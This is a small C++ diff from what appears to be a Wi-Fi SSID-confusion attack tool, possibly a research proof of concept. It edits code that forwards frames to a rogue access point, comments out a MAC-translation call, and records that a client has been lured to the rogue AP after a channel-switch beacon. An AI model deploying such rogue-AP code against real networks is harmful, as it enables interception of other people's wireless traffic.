@@ -48,8 +48,8 @@ void SsidConfusion::send_to_rogue(PDU &pdu) const {
 }
 
 void SsidConfusion::send_to_rogue(const frame_raw_t &raw) const {
-	auto translated = ensure_radiotap(raw);
-	translate_data_mac(translated, ap->get(SK::mac), rogue_ap->get(SK::mac));
+	const auto translated = ensure_radiotap(raw);
+	//translate_data_mac(translated, ap->get(SK::mac), rogue_ap->get(SK::mac));
 	sock_rogue->send(translated, netconfig.rogue_channel);
 }
 
@@ -81,6 +81,7 @@ FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Do
 		if(addr2 == sta.get(SK::mac)){
 			display_traffic(dot11, "Real channel", " -- send CSA");
 			send_csa_beacon();
+			client_state.update_state(ClientState::Sent_to_rogue);
 		}
 		return STOP;
 	}
